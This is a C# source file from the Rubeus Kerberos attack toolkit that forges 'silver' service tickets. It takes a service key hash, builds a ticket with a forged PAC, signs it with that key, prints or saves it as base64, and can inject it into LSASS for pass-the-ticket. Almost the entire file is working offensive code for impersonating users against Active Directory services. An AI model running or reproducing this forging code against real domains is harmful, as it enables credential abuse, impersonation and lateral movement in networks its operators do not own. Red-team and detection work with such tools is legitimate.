using System;
using System.Text;
using Rubeus.lib.Interop;
using Rubeus.Kerberos.PAC;
using Rubeus.Kerberos;
using Rubeus.Ndr;
using System.Collections.Generic;

namespace Rubeus
{
    public class ForgeTicket
    {
        public static void Silver(string user, string sname, string keyString, Interop.KERB_ETYPE etype, string sid, string domain = "", int uid = 500, string outfile = null, bool ptt = false, Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent)
        {
            UnicodeEncoding unicode = new UnicodeEncoding();
            // temp vars for LogonInfo section
            /*
            _FILETIME testTime = new _FILETIME();
            byte[] userBytes = Encoding.Unicode.GetBytes(user);
            _RPC_UNICODE_STRING pacUser = new _RPC_UNICODE_STRING((short)unicode.GetCharCount(userBytes), (short)unicode.GetMaxCharCount(unicode.GetCharCount(userBytes)), unicode.GetChars(userBytes));
            int pgid = 513;
            int[] gids = { 513, 512, 520, 518, 519 };
            _GROUP_MEMBERSHIP[] pacGids = new _GROUP_MEMBERSHIP[gids.Length];
            for (int i = 0; i < gids.Length; i++)
            {
                pacGids[i] = new _GROUP_MEMBERSHIP(gids[i], 0);
            }
            Interop.PacUserFlags userFlags = Interop.PacUserFlags.EXTRA_SIDS;
            string dcName = "DC1";
            byte[] dcNameBytes = Encoding.Unicode.GetBytes(dcName);
            _RPC_UNICODE_STRING pacDcName = new _RPC_UNICODE_STRING((short)unicode.GetCharCount(dcNameBytes), (short)unicode.GetMaxCharCount(unicode.GetCharCount(dcNameBytes)), unicode.GetChars(dcNameBytes));
            string netbiosName = null;
            Interop.PacUserAccountControl pacUAC = Interop.PacUserAccountControl.NORMAL_ACCOUNT;
            string[] sids = { "S-1-18-1" };
            _RPC_UNICODE_STRING emptyString = new _RPC_UNICODE_STRING();
            _USER_SESSION_KEY pacSess = new _USER_SESSION_KEY();
            pacSess.data = new _CYPHER_BLOCK[2];
            pacSess.data[0].data = new sbyte[8] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
            pacSess.data[1].data = new sbyte[8] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
            char[] sidArr = sid.ToCharArray();
            int[] sidInt = new int[sidArr.Length];
            for (int i = 0; i < sidArr.Length; i++)
            {
                sidInt[i] = Convert.ToInt32(sidArr[i]);
            }
            _RPC_SID pacSid = new _RPC_SID(0x01, 0x01, new _RPC_SID_IDENTIFIER_AUTHORITY(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x05 }), sidInt);
            pacSid.SubAuthorityCount = 1;
            pacSid.IdentifierAuthority.Value = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x05 };
            _KERB_SID_AND_ATTRIBUTES[] pacSids = new _KERB_SID_AND_ATTRIBUTES[0];*/

            // determine domain if not supplied
            string[] parts = sname.Split('/');
            if (String.IsNullOrEmpty(domain))
            {
                if ((parts.Length > 1) && (parts[0] == "krbtgt"))
                {
                    Console.WriteLine("[X] Referral TGT requires /domain to be passed.");
                    return;
                }
                else if ((parts.Length == 1) && (sname.Split('@').Length == 1))
                {
                    Console.WriteLine("[X] SPN has to be in the format 'svc/host.domain.com' or 'host@domain.com'.");
                    return;
                }
                else if (parts.Length > 1)
                {
                    domain = parts[1].Substring(parts[1].IndexOf('.') + 1);
                    string[] domainParts = domain.Split(':');
                    if (domainParts.Length > 1)
                    {
                        domain = domainParts[0];
                    }
                }
                else if (sname.Split('@').Length > 1)
                {
                    domain = sname.Split('@')[1];
                }
                else
                {
                    Console.WriteLine("[X] SPN is in a unsupported format: {0}.", sname);
                    return;
                }
            }
            /*if (String.IsNullOrEmpty(netbiosName))
            {
                netbiosName = domain.Substring(0, domain.IndexOf('.')).ToUpper();
            }
            byte[] pacNetbiosName = unicode.GetBytes(netbiosName);
            _RPC_UNICODE_STRING pacUniNetbiosName = new _RPC_UNICODE_STRING((short)unicode.GetCharCount(pacNetbiosName), (short)unicode.GetMaxCharCount(unicode.GetCharCount(pacNetbiosName)), unicode.GetChars(pacNetbiosName));
            */

            // initialize some structures
            KRB_CRED cred = new KRB_CRED();
            KrbCredInfo info = new KrbCredInfo();

            // generate PAC sections
            /*LogonInfo li = new LogonInfo();
            li.KerbValidationInfo = new _KERB_VALIDATION_INFO(
                testTime, testTime, testTime, testTime, testTime, testTime, pacUser, pacUser,
                emptyString, emptyString, emptyString, emptyString, 1, 0, uid, pgid, gids.Length, pacGids, (int)userFlags, pacSess, pacDcName,
                pacUniNetbiosName, pacSid, new int[0], (int)pacUAC, new int[0], pacSids.Length, pacSids, null, 0, null);*/

            ClientName cn = new ClientName(DateTime.Now, user);
            SignatureData svrSigData = new SignatureData(PacInfoBufferType.ServerChecksum);
            SignatureData kdcSigData = new SignatureData(PacInfoBufferType.KDCChecksum);
            int sigLength = 12;

            // generate a random session key
            Random random = new Random();
            byte[] randKeyBytes;
            if (etype == Interop.KERB_ETYPE.rc4_hmac)
            {
                randKeyBytes = new byte[16];
                random.NextBytes(randKeyBytes);
                svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                sigLength = 16;
            }
            else if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
            {
                randKeyBytes = new byte[32];
                random.NextBytes(randKeyBytes);
                svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
                kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
            }
            else
            {
                Console.WriteLine("[X] Only rc4_hmac and aes256_cts_hmac_sha1 key hashes supported at this time!");
                return;
            }

            EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, domain.ToUpper(), user, flags);

            // generate clear signatures
            svrSigData.Signature = new byte[sigLength];
            kdcSigData.Signature = new byte[sigLength];
            Array.Clear(svrSigData.Signature, 0, sigLength);
            Array.Clear(kdcSigData.Signature, 0, sigLength);

            // get the key from keyString
            byte[] key = Helpers.StringToByteArray(keyString);

            // add sections to the PAC, get bytes and generate checksums
            List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
            //PacInfoBuffers.Add(li);
            PacInfoBuffers.Add(cn);
            PacInfoBuffers.Add(svrSigData);
            PacInfoBuffers.Add(kdcSigData);
            PACTYPE pt = new PACTYPE(0, PacInfoBuffers);
            byte[] ptBytes = pt.Encode();
            byte[] svrSig = Crypto.KerberosChecksum(key, ptBytes, svrSigData.SignatureType);
            byte[] kdcSig = Crypto.KerberosChecksum(key, svrSig, kdcSigData.SignatureType);

            // add checksums
            svrSigData.Signature = svrSig;
            kdcSigData.Signature = kdcSig;
            PacInfoBuffers = new List<PacInfoBuffer>();
            //PacInfoBuffers.Add(li);
            PacInfoBuffers.Add(cn);
            PacInfoBuffers.Add(svrSigData);
            PacInfoBuffers.Add(kdcSigData);
            pt = new PACTYPE(0, PacInfoBuffers);

            // add the PAC to the ticket
            decTicketPart.SetPac(pt);


            // encrypt the EncTicketPart
            byte[] encTicketData = decTicketPart.Encode().Encode();
            byte[] encTicketPart = Crypto.KerberosEncrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, encTicketData);

            // initialize the ticket and add the enc_part
            Ticket ticket = new Ticket(domain.ToUpper(), sname);
            ticket.enc_part = new EncryptedData((Int32)etype, encTicketPart, 3);

            // add the ticket
            cred.tickets.Add(ticket);

            // [0] add in the session key
            info.key.keytype = (int)etype;
            info.key.keyvalue = randKeyBytes;

            // [1] prealm (domain)
            info.prealm = decTicketPart.crealm;

            // [2] pname (user)
            info.pname.name_type = decTicketPart.cname.name_type;
            info.pname.name_string = decTicketPart.cname.name_string;

            // [3] flags
            info.flags = flags;

            // [4] authtime (not required)
            info.authtime = decTicketPart.authtime;

            // [5] starttime
            info.starttime = decTicketPart.starttime;

            // [6] endtime
            info.endtime = decTicketPart.endtime;

            // [7] renew-till
            info.renew_till = decTicketPart.renew_till;

            // [8] srealm
            info.srealm = ticket.realm;

            // [9] sname
            info.sname.name_type = ticket.sname.name_type;
            info.sname.name_string = ticket.sname.name_string;

            // add the ticket_info into the cred object
            cred.enc_part.ticket_info.Add(info);

            byte[] kirbiBytes = cred.Encode().Encode();

            string kirbiString = Convert.ToBase64String(kirbiBytes);

            Console.WriteLine("[*] Forged a TGS for '{0}' to '{1}'", info.pname.name_string[0], sname);
            Console.WriteLine("[*] base64(ticket.kirbi):\r\n");

            if (Program.wrapTickets)
            {
                // display the .kirbi base64, columns of 80 chararacters
                foreach (string line in Helpers.Split(kirbiString, 80))
                {
                    Console.WriteLine("      {0}", line);
                }
            }
            else
            {
                Console.WriteLine("      {0}", kirbiString);
            }

            Console.WriteLine("");

            if (!String.IsNullOrEmpty(outfile))
            {
                string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
                filename = Helpers.MakeValidFileName(filename);
                if (Helpers.WriteBytesToFile(filename, kirbiBytes))
                {
                    Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
                }
            }

            if (ptt)
            {
                // pass-the-ticket -> import into LSASS
                LSA.ImportTicket(kirbiBytes, new LUID());
            }
        }
    }
}
